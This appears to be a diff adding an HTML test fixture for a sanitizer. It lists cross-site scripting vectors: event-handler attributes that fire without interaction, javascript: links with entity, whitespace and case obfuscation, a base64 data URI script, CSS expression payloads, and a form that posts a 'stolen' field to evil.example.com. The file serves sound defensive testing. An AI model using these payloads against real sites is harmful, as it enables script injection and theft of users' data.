@@ -1,0 +1,48 @@
+<!doctype html>
+<!--
+  Event handler attributes, including the ones that fire without any user interaction.
+
+  Expectation: no attribute beginning with "on" survives, and no javascript: URI survives in any
+  attribute the sanitizer treats as a URI.
+-->
+<html>
+  <body>
+    <!-- Fires immediately on a broken image. The most reliable no-interaction vector there is. -->
+    <img src="does-not-exist.png" onerror="alert('xss')" alt="Broken image" />
+
+    <!-- Fires on load, no interaction needed. -->
+    <body onload="alert('body onload')">
+      <svg onload="alert('svg onload')"><circle r="10" /></svg>
+
+      <div onmouseover="alert('hover')" onclick="alert('click')" onfocus="alert('focus')">
+        Hover, click, or focus me.
+      </div>
+
+      <!-- Autofocus plus onfocus fires without the user doing anything at all. -->
+      <input autofocus onfocus="alert('autofocus')" />
+
+      <!-- javascript: in an href. -->
+      <a href="javascript:alert('href')">A link</a>
+
+      <!-- Whitespace and entity obfuscation of the same scheme. -->
+      <a href="java&#115;cript:alert('entity')">Entity encoded</a>
+      <a href="  javascript:alert('leading space')">Leading whitespace</a>
+      <a href="JaVaScRiPt:alert('case')">Mixed case</a>
+
+      <!-- Data URI carrying HTML, which becomes script once navigated. -->
+      <a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">Data URI</a>
+
+      <!-- Style with an expression, for the benefit of older engines. -->
+      <div style="background: url(javascript:alert('css'))">Styled</div>
+      <div style="width: expression(alert('expression'))">IE expression</div>
+
+      <!-- Form action pointing off-site. -->
+      <form action="https://evil.example.com/collect" method="post">
+        <input type="hidden" name="stolen" value="data" />
+        <button type="submit">Submit</button>
+      </form>
+
+      <p>Ordinary text that must survive.</p>
+    </body>
+  </body>
+</html>
